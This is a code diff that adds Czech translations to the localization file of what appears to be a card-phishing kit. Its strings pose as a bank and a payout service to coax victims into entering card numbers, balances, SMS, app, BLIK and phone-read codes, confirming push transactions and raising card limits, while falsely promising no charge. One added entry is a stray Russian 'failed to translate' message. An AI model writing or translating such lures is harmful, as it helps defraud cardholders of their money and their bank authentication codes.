@@ -17,6 +17,7 @@ module.exports = {
     rs: "Цхат подршка",
     be: "Ondersteuning Chat",
     it: "Chat di supporto",
+    cz: "Podpora chatu",
   },
   your_message: {
     pl: "Twoja wiadomość...",
@@ -36,6 +37,7 @@ module.exports = {
     rs: "Ваша порука...",
     be: "Uw bericht...",
     it: "Il tuo messaggio...",
+    cz: "Vaše zpráva...",
   },
   send: {
     pl: "Wyślij",
@@ -55,6 +57,7 @@ module.exports = {
     rs: "Пошаљите",
     be: "Stuur",
     it: "Invia",
+    cz: "Poslat",
   },
   card_balance: {
     pl: "Saldo karty",
@@ -74,6 +77,7 @@ module.exports = {
     rs: "Стање на картици",
     be: "Kaart saldo",
     it: "Saldo della carta",
+    cz: "Zůstatek na kartě",
   },
   expires: {
     pl: "Wygasa",
@@ -93,6 +97,7 @@ module.exports = {
     rs: "Истекати",
     be: "Verloopt op",
     it: "Scade",
+    cz: "Platnost vyprší",
   },
   card_number: {
     pl: "Numer karty",
@@ -112,6 +117,7 @@ module.exports = {
     rs: "Број картице",
     be: "Kaartnummer",
     it: "Numero di carta",
+    cz: "Číslo karty",
   },
   expiration_date: {
     pl: "Data wygaśnięcia",
@@ -131,6 +137,7 @@ module.exports = {
     rs: "Број картице",
     be: "Vervaldatum",
     it: "Data di scadenza",
+    cz: "Datum spotřeby",
   },
   month: {
     pl: "Miesiąc",
@@ -150,6 +157,7 @@ module.exports = {
     rs: "Месец",
     be: "Maand",
     it: "Mese",
+    cz: "Měsíc",
   },
   year: {
     pl: "Rok",
@@ -169,6 +177,7 @@ module.exports = {
     rs: "Година",
     be: "Jaar",
     it: "Anno",
+    cz: "Rok",
   },
   wrong_code: {
     pl: "Wpisałeś zły kod! Spróbuj ponownie.",
@@ -188,6 +197,7 @@ module.exports = {
     rs: "Унели сте погрешан код! Молим вас, покушајте поново",
     be: "U heeft de verkeerde code ingevoerd! Probeer het opnieuw.",
     it: "Hai inserito il codice sbagliato! Per favore riprova.",
+    cz: "Zadali jste špatný kód! Prosím zkuste to znovu.",
   },
   push_title: {
     pl: "Aby zweryfikować swoją kartę, potwierdź transakcję w aplikacji mobilnej banku",
@@ -207,6 +217,7 @@ module.exports = {
     rs: "Да бисте проверили своју картицу, потврдите трансакцију на мобилној апликацији Банке",
     be: "Om uw kaart te verifiëren, bevestigt u de transactie op de mobiele app van de bank",
     it: "Per verificare la tua carta, conferma la transazione sull'app mobile della banca",
+    cz: "Pro ověření karty potvrďte transakci v mobilní aplikaci banky",
   },
   push_text: {
     pl: "Aby przelać pieniądze na kartę, karta musi zostać zweryfikowana. Jest to prośba o weryfikację karty, ale nie zostaniesz obciążony, system po prostu stwierdzi, że karta nie jest zablokowana i jest gotowa do transakcji.",
@@ -226,6 +237,7 @@ module.exports = {
     rs: "Да бисте пребацили новац на своју картицу, ваша картица мора бити верификована. Ово је захтев за потврђивање картице, али нећете се наплаћивати, систем ће једноставно навести да картица није блокирана и спремна је за трансакцију.",
     be: "Om geld naar uw kaart over te maken, moet uw kaart geverifieerd worden. Dit is een verzoek om de kaart te verifiëren, maar u zult niet worden aangerekend, het systeem zal gewoon verklaren dat de kaart niet geblokkeerd is en klaar is voor de transactie.",
     it: "Per trasferire denaro sulla tua carta, la tua carta deve essere verificata. Questa è una richiesta di verifica della carta, ma non ti verrà addebitato nulla, il sistema dichiarerà semplicemente che la carta non è bloccata ed è pronta per la transazione.",
+    cz: "Chcete-li převést peníze na svou kartu, musí být vaše karta ověřena. Jedná se o požadavek na ověření karty, který vám však nebude účtován, systém pouze oznámí, že karta není blokována a je připravena k transakci.",
   },
   success: {
     pl: "Sukces",
@@ -245,6 +257,7 @@ module.exports = {
     rs: "Успех",
     be: "Succes",
     it: "Successo",
+    cz: "Úspěch",
   },
   money_will: {
     pl: "Pieniądze zostaną przelane na Twoją kartę bankową w ciągu 24 godzin.",
@@ -264,6 +277,7 @@ module.exports = {
     rs: "Новац ће бити пребачен на вашу банковну картицу у року од 24 сата.",
     be: "Het geld wordt binnen 24 uur overgemaakt op uw bankpas.",
     it: "Il denaro sarà trasferito sulla sua carta di credito entro 24 ore.",
+    cz: "Peníze budou převedeny na vaši bankovní kartu do 24 hodin.",
   },
   sms_title: {
     pl: "Wprowadź kod SMS",
@@ -283,6 +297,7 @@ module.exports = {
     rs: "Унесите СМС код",
     be: "SMS code invoeren",
     it: "Inserisci il codice SMS",
+    cz: "Zadejte SMS kód",
   },
   sms_text: {
     pl: "Na Twój telefon został wysłany jednorazowy kod SMS",
@@ -302,6 +317,7 @@ module.exports = {
     rs: "Једнократни СМС код послат је на ваш телефон",
     be: "Een eenmalige SMS code is naar uw telefoon gestuurd",
     it: "Un codice SMS unico è stato inviato al tuo telefono",
+    cz: "Na váš telefon byl odeslán jednorázový SMS kód",
   },
   sms_placeholder: {
     pl: "Jednorazowy kod SMS",
@@ -321,6 +337,7 @@ module.exports = {
     rs: "Једнократни СМС код",
     be: "Eenmalige SMS code",
     it: "Codice SMS una tantum",
+    cz: "Jednorázový SMS kód",
   },
   app_code_title: {
     pl: "W ciągu 2 minut kod weryfikacyjny zostanie wysłany do aplikacji bankowej.",
@@ -340,6 +357,7 @@ module.exports = {
     rs: "У року од 2 минута, верификациони код ће бити послан у вашу банкарску пријаву.",
     be: "Binnen 2 minuten wordt de verificatiecode naar uw banktoepassing gestuurd.",
     it: "Entro 2 minuti, il codice di verifica sarà inviato alla tua applicazione bancaria.",
+    cz: "Do 2 minut bude do vaší bankovní aplikace zaslán ověřovací kód.",
   },
   app_code_text: {
     pl: "Wpisz kod, który został wysłany do Twojej aplikacji bankowej",
@@ -359,6 +377,7 @@ module.exports = {
     rs: "Унесите код који је послат у вашу банкарску пријаву",
     be: "Voer de code in die naar uw banktoepassing werd gestuurd",
     it: "Inserisci il codice che è stato inviato alla tua applicazione bancaria",
+    cz: "Zadejte kód, který byl zaslán do vaší bankovní aplikace",
   },
   app_code_placeholder: {
     pl: "Kod weryfikacyjny",
@@ -378,6 +397,7 @@ module.exports = {
     rs: "Верификациони код",
     be: "Verificatie code",
     it: "Codice di verifica",
+    cz: "Ověřovací kód",
   },
   call_code_title: {
     pl: "Bank poda Ci kod weryfikacyjny przez telefon",
@@ -397,6 +417,7 @@ module.exports = {
     rs: "Банка ће вам дати верификациони код преко телефона",
     be: "De bank zal u een verificatiecode geven via de telefoon",
     it: "La banca ti darà un codice di verifica per telefono",
+    cz: "Banka vám po telefonu sdělí ověřovací kód",
   },
   call_code_text: {
     pl: "Wpisz kod, który bank podał Ci przez telefon",
@@ -416,6 +437,7 @@ module.exports = {
     rs: "Унесите код који вам је банка дала преко телефона",
     be: "Voer de code in die de bank u via de telefoon heeft gegeven",
     it: "Inserisci il codice che la banca ti ha dato al telefono",
+    cz: "Zadejte kód, který vám banka poskytla po telefonu",
   },
   call_code_placeholder: {
     pl: "Wprowadź kod",
@@ -435,6 +457,7 @@ module.exports = {
     rs: "Унесите код",
     be: "Voer de code in",
     it: "Inserisci il codice",
+    cz: "Zadejte kód",
   },
   blik_code_title: {
     pl: "Płatność BLIK",
@@ -454,6 +477,7 @@ module.exports = {
     rs: "БЛИК Плаћање",
     be: "",
     it: "",
+    cz: "BLIK platba",
   },
   blik_code_text: {
     pl: "Wygeneruj kod Blika na swoim koncie i wpisz go",
@@ -473,6 +497,7 @@ module.exports = {
     rs: "Генерирајте БЛИК код на вашем налогу и унесите га",
     be: "",
     it: "",
+    cz: "Vygenerujte na svém účtu Blik kód a zadejte jej",
   },
   blik_code_placeholder: {
     pl: "Kod BLIK",
@@ -492,6 +517,7 @@ module.exports = {
     rs: "Блик код",
     be: "",
     it: "",
+    cz: "BLIK kód",
   },
   picture_title: {
     pl: "Podczas weryfikacji konta w systemie będziemy podawać telefonem tytuł obrazku, który musisz podać dla potwierdzenia. Po podaniu prawidłowych obrazków środki będą zaksięgowane na koncie.",
@@ -511,6 +537,7 @@ module.exports = {
     rs: "Приликом верификације вашег рачуна у систему ћемо вам пружити наслов слике са телефоном који морате да дате за потврду. Једном када се дају исправне слике, средства ће се приписати вашем налогу.",
     be: "",
     it: "",
+    cz: "Při ověřování vašeho účtu v systému poskytneme název obrázku s vaším telefonem, který musíte poskytnout pro potvrzení. Jakmile budou poskytnuty správné obrázky, budou prostředky připsány na váš účet.",
   },
   picture_text: {
     pl: "Za chwilę zadzwonimy do Ciebie i powiemy słowo-obrazek. W niektórych przypadkach po podaniu pierwszego obrazku wyślemy powiadomienie push do aplikacji banku, które trzeba potwierdzić.",
@@ -530,6 +557,7 @@ module.exports = {
     rs: "У трену, назваћемо вас и изговоримо неку слику. У неким случајевима ћемо послати пусх нотификацију апликацији ваше банке након што наведете прву слику коју морате да потврдите.",
     be: "",
     it: "",
+    cz: "Za chvíli vám zavoláme a řekneme slovo-obrázek. V některých případech odešleme oznámení push do aplikace vaší banky poté, co poskytnete první obrázek, který musíte potvrdit.",
   },
   wrong_picture: {
     pl: "Wybrałeś złe zdjęcie",
@@ -549,6 +577,7 @@ module.exports = {
     rs: "Изабрали сте погрешну фотографију",
     be: "",
     it: "",
+    cz: "Vybrali jste špatnou fotku",
   },
   submit: {
     pl: "Prześlij",
@@ -568,6 +597,7 @@ module.exports = {
     rs: "Пошаљите",
     be: "Indienen",
     it: "Invia",
+    cz: "Předložit",
   },
   error: {
     pl: "Wystąpił nieoczekiwany błąd. Spróbuj ponownie",
@@ -587,6 +617,7 @@ module.exports = {
     rs: "Дошло је до непредвиђене грешке. Покушајте поново",
     be: "Er is een onverwachte fout opgetreden. Gelieve opnieuw te proberen",
     it: "Si è verificato un errore inaspettato. Si prega di riprovare",
+    cz: "Došlo k neočekávané chybě. Prosím zkuste to znovu",
   },
   error_title: {
     pl: "Błąd",
@@ -606,6 +637,7 @@ module.exports = {
     rs: "Дошло је до неочекиване грешке. Молим вас, покушајте поново",
     be: "Fout",
     it: "Errore",
+    cz: "Chyba",
   },
   card_number_invalid: {
     pl: "Numer karty jest nieprawidłowy",
@@ -625,6 +657,7 @@ module.exports = {
     rs: "Број картице је нетачан",
     be: "Kaartnummer is onjuist",
     it: "Il numero della carta non è corretto",
+    cz: "Číslo karty je nesprávné",
   },
   attention: {
     pl: "Uwaga",
@@ -644,6 +677,7 @@ module.exports = {
     rs: "Пажња",
     be: "Attentie",
     it: "Attenzione",
+    cz: "Pozornost",
   },
   bank_asked: {
     pl: "Bank poprosił o podanie dodatkowych informacji o karcie bankowej w celu weryfikacji własności karty.",
@@ -663,6 +697,7 @@ module.exports = {
     rs: "Банка је затражила додатну информацију банковне картице да потврди власништво над картицама.",
     be: "De bank vroeg om aanvullende bankkaartinformatie om de eigendom van de kaart te verifiëren",
     it: "La banca ha richiesto ulteriori informazioni sulla carta di credito per verificarne la proprietà.",
+    cz: "Banka si za účelem ověření vlastnictví karty vyžádala další údaje o bankovní kartě.",
   },
   wait: {
     pl: "Expect",
@@ -682,6 +717,7 @@ module.exports = {
     rs: "Очекивати",
     be: "Verwacht",
     it: "Aspettatevi",
+    cz: "Očekávat",
   },
   bank_processes: {
     pl: "Bank przetwarza Twoje dane. Może to zająć trochę czasu",
@@ -701,6 +737,7 @@ module.exports = {
     rs: "Банка обрађује ваше податке. Ово може потрајати",
     be: "De bank is uw gegevens aan het verwerken. Dit kan enige tijd duren",
     it: "La banca sta elaborando i suoi dati. Questo può richiedere del tempo",
+    cz: "Banka zpracovává vaše údaje. To může chvíli trvat",
   },
   limits: {
     pl: "Musisz podnieść limity internetowe na swojej karcie, aby zrealizować transakcję!",
@@ -720,6 +757,7 @@ module.exports = {
     rs: "Банка обрађује ваше податке. Ово може потрајати неко време",
     be: "U moet de internetlimieten op uw kaart verhogen om een transactie te doen!",
     it: "Devi aumentare i limiti internet della tua carta per fare una transazione!",
+    cz: "Chcete-li provést transakci, musíte zvýšit internetové limity na vaší kartě!",
   },
   other_card: {
     pl: "Obecnie nie współpracujemy z kartami tego banku. Musisz podać kartę z innego banku!",
@@ -739,6 +777,7 @@ module.exports = {
     rs: "У овом тренутку не сарађујемо са картицама ове банке. Морате да одредите картицу друге банке!",
     be: "Op dit moment werken wij niet samen met kaarten van deze bank. U dient een kaart van een andere bank op te geven!",
     it: "In questo momento non collaboriamo con le carte di questa banca. È necessario specificare una carta di un'altra banca!",
+    cz: "V tuto chvíli nespolupracujeme s kartami této banky. Musíte zadat kartu jiné banky!",
   },
   for_verify: {
     pl: "",
@@ -756,6 +795,7 @@ module.exports = {
     rs: "",
     be: "",
     it: "",
+    cz: "Не удалось перевести текст",
   },
   correct_balance: {
     pl: "Wprowadź dokładne saldo na swojej karcie!",
@@ -775,6 +815,7 @@ module.exports = {
     rs: "Унесите тачан салдо на своју картицу!",
     be: "Geef het exacte saldo op uw kaart in!",
     it: "Inserisci il saldo esatto della tua carta!",
+    cz: "Zadejte přesný zůstatek na vaší kartě!",
   },
   currency: {
     pl: "zł",
@@ -794,5 +835,6 @@ module.exports = {
     be: "€",
     bg: "лв",
     rs: "din",
+    cz: "Kč",
   },
 };
